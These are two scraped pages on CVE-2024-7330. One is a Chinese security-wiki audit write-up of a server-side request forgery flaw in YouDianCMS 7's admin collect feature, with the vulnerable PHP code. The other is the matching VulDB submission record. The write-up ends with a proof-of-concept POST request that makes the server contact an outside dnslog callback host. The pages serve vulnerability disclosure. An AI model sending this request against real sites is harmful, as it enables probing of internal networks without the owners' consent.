=== Content from wiki.shikangsi.com_93b63f22_20250111_102341.html ===

# 安全团队贡献平台

导航切换

* [首页](/)
* 所有信息
  + [所有情报](/list/all/)
  + [推荐专区](/list/recommend/)
  + [综合情报](/list/wiki/)
  + [用户提交](/list/userpost/)
  + [高校情报](/list/school/)
* [排行榜](/user/)
* [礼品中心](/gift/)
* [搜索](/search/)
* [公告](/announcements/)
* [IPwhois新功能](/ip/)
* [WooYun drops新功能](/wooyun/)
* 更多
  + [edudata平台](https://wiki.shikangsi.com/cas/jump/edudata)
  + [零组知识库-006应急响应目录](https://wiki.shikangsi.com/post/3629/)
  + [零组知识库-007内网渗透目录](https://wiki.shikangsi.com/post/3631/)
  + [零组知识库-009安全技术目录](https://wiki.shikangsi.com/post/3632/)
  + [零组知识库-010域渗透目录](https://wiki.shikangsi.com/post/3633/)
  + [零组知识库-011运维与二进制安全目录](https://wiki.shikangsi.com/post/3634/)
  + [XSS平台](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrc数据分析](http://data.shikangsi.com/)
  + [友情链接](https://wiki.shikangsi.com/links/)
  + [wiki社区](https://wiki.shikangsi.com/zone/)

[提交贡献](/add/)

[登录](/login/)

[注册](/register/)

# 【原创】（CVE-2024-7330）YouDianCMS 7 SSRF漏洞

---

分享
### 当前为私密分享，无需登录即可查看。

---

| 时间 | 作者 | 可见性 | 等级 | Rank |
| --- | --- | --- | --- | --- |
|| 2024-07-21 23:55:43 | [Mstir](/profile/607/) | 公开的 | 中危 | 0 |
| --- | --- | --- | --- | --- |

CVE-2024-7330
Created: 07/31/2024 02:19 PM
Updated: 08/01/2024 01:20 PM
Changes: 07/31/2024 02:19 PM (56), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)
Submitter: Mstir@Wiki

---

# 漏洞描述

> YouDianCMS 是一款内容管理系统，广泛用于网站内容的创建、管理和发布。

在YouDianCMS后台的`/App/Core/Extend/Function/ydLib.php`文件中，使用了`curl_exec`函数去访问`$url`变量。通过全局搜索调用`yd_curl_get`函数的文件，发现`/App/Lib/Action/Admin/CollectAction.class.php`文件中调用了此函数。

`CollectAction.class.php`中的`testField`方法通过`$_POST`接收`TestDetailUrl`参数，并使用`curl_exec`发起网络请求。由于`$url`变量未经过严格的验证和过滤，攻击者可以构造恶意的URL，导致SSRF（服务器端请求伪造）漏洞。攻击者可以利用此漏洞发起对内部网络的请求，可能导致敏感信息泄露或对内部网络的进一步攻击。

# 审计过程

问题出自 /App/Core/Extend/Function/ydLib.php 使用了curl\_exec函数去访问\$url变量.

```
function yd_curl_get($url, $data=false, $timeout = 5, $options=array() ){
  //http_build_query(array('foo'=>'bar','baz'=>'boom')); 输出：foo=bar&baz=boom
  if(!empty($data)){
    $url .= '?'.http_build_query($data);
  }
  if( function_exists('curl_init') ){
    $ch = curl_init( $url );
    //症状：php curl调用https出错 排查方法：在命令行中使用curl调用试试。
    //原因：服务器所在机房无法验证SSL证书。解决办法：跳过SSL证书检查。
    //不加上CURLOPT_SSL_VERIFYPEER，curl_exec总是返回false
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:220.181.136.242', 'CLIENT-IP:220.181.136.242'));
    //CURLOPT_REFERER、CURLOPT_USERAGENT
    foreach ($options as $k=>$v){
      $k = is_numeric($k) ? $k : constant($k);
      curl_setopt($ch, $k, $v);
    }
    $res = curl_exec($ch);
    curl_close($ch);
  }else{
    //利用了stream_context_create()设置超时时间:
    //当读取https协议时，需要服务器支持open_ssl模块
    $opts = array( 'http' => array('timeout' => $timeout, 'method'=>"GET", 'header'=>'') );
    if( $options['CURLOPT_REFERER']){
      $opts['header'] .= "Referer:".$options['CURLOPT_REFERER']."\r\n";
    }
    if( $options['CURLOPT_USERAGENT']){
      $opts['header'] .= "User-Agent:".$options['CURLOPT_USERAGENT']."\r\n";
    }
    $context = stream_context_create( $opts );
    $res = @file_get_contents( $url, false, $context );
  }
  return $res;
}

```

调用该方法的程序: /App/Lib/Action/Admin/CollectAction.class.php

```
public function testField()
    {
        header("Content-Type:text/html; charset=utf-8");
        $url = trim($_POST["TestDetailUrl"]);

        if (empty($url)) {
            if (empty($_POST["DetailUrlRegex"])) {
                $url = $_POST["ListUrl"];
            }
            else {
                $result = $this->_collectList($_POST);

                if (is_array($result)) {
                    $index = rand(0, count($result) - 1);
                    $url = $result[$index];
                }
                else {
                    $this->ajaxReturn($result, "", 0);
                }
            }
        }

        $data = $this->_collectContent($url, $_POST["FieldInfo"], $_POST["ReplacePara"], $_POST);

        if (is_array($data)) {
            $this->ajaxReturn($data, $url, 1);
        }
        else {
            $this->ajaxReturn($data, $url, 0);
        }
    }

```
# POC

```
POST /index.php/Admin/Collect/testField HTTP/1.1
Host: [目标域名]
Content-Type: application/x-www-form-urlencoded
Cookie: [目标Cookie]
Content-Length: 30

TestDetailUrl=xxx.dnslog.cn

```

---

审核评价： 没有任何评价...

2014-2022 © 联系邮箱：admin@sg95.cn    [鄂ICP备15020128号-4](https://beian.miit.gov.cn)



=== Content from vuldb.com_7f2ad12e_20250111_102339.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)🛡 Home[Submit](?submit)378325
# Submit #378325: 长沙友点软件科技有限公司 YouDianCMS 7 Server-Side Request Forgery[info](?kb.submission)

| Title | 长沙友点软件科技有限公司 YouDianCMS 7 Server-Side Request Forgery |
| --- | --- |
| Description | YouDianCMS 是一款内容管理系统，广泛用于网站内容的创建、管理和发布。 在YouDianCMS后台的/App/Core/Extend/Function/ydLib.php文件中，使用了curl\_exec函数去访问$url变量。通过全局搜索调用yd\_curl\_get函数的文件，发现/App/Lib/Action/Admin/CollectAction.class.php文件中调用了此函数。 CollectAction.class.php中的testField方法通过$\_POST接收TestDetailUrl参数，并使用curl\_exec发起网络请求。由于$url变量未经过严格的验证和过滤，攻击者可以构造恶意的URL，导致SSRF（服务器端请求伪造）漏洞。攻击者可以利用此漏洞发起对内部网络的请求，可能导致敏感信息泄露或对内部网络的进一步攻击。 |
| Source | ⚠️ https://wiki.shikangsi.com/post/share/c065b84c-f2ab-4679-9336-de7fb1ebba1f |
| User | [XingYue\_Mstir (UID 72225)](?user.72225) |
| Submission | 07/21/2024 06:25 PM (6 months ago) |
| Moderation | 07/31/2024 02:14 PM (10 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [273253](?id.273253) [YouDianCMS 7 ydLib.php curl\_exec url server-side request forgery] |
| Points | 20 |

[◂ Previous](?submit.378324)[Overview](?submit)[Next ▸](?submit.378326)

# Are you interested in using VulDB?

Download the whitepaper to learn more about our service!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[© 1997-2025 vuldb.com](?kb.terms) · [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.378325 "German") · [fr](/fr/?submit.378325 "French") · [it](/it/?submit.378325 "Italian") · [es](/es/?submit.378325 "Spanish") · [pt](/pt/?submit.378325 "Portuguese") · [ru](/ru/?submit.378325 "Russian") · [pl](/pl/?submit.378325 "Polish") · [sv](/sv/?submit.378325 "Swedish") · [zh](/zh/?submit.378325 "Chinese") · [ja](/ja/?submit.378325 "Japanese") · [ar](/ar/?submit.378325 "Arabic")[v18.14.7](?kb.changelog)
